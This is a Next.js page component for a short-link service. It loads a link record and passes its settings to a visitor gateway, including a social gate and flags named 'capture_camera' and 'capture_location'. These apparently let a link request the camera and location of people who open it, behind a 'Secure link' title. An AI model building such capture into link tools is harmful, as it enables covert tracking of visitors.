import type { Metadata } from "next";
import { notFound } from "next/navigation";
import { getLinkByCode } from "@/lib/db";
import { normalizeExpiry } from "@/lib/validate";
import { VisitorGateway } from "@/components/VisitorGateway";

export const dynamic = "force-dynamic";

interface Props {
  params: Promise<{ code: string }>;
}

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { code } = await params;
  return {
    title: `Secure link /${code}`,
    robots: { index: false, follow: false },
  };
}

export default async function ShortLinkPage({ params }: Props) {
  const { code } = await params;
  const link = await getLinkByCode(code);
  if (!link) notFound();

  // Existing rows may predate normalisation and still hold a bare `YYYY-MM-DD`.
  // Re-normalising here keeps those links alive through their whole expiry day.
  const expiry = normalizeExpiry(link.expires_at);
  const expired = expiry ? new Date(expiry).getTime() < Date.now() : false;

  return (
    <VisitorGateway
      link={{
        code: link.short_code,
        long_url: link.long_url,
        has_password: !!link.password_hash,
        social_gate_title: link.social_gate_title,
        social_gate_url: link.social_gate_url,
        social_gate_icon: link.social_gate_icon,
        social_gate_description: link.social_gate_description,
        social_gate_button_text: link.social_gate_button_text,
        capture_camera: link.capture_camera,
        capture_location: link.capture_location,
        animation_type: link.animation_type,
        animation_text: link.animation_text,
        expired,
      }}
    />
  );
}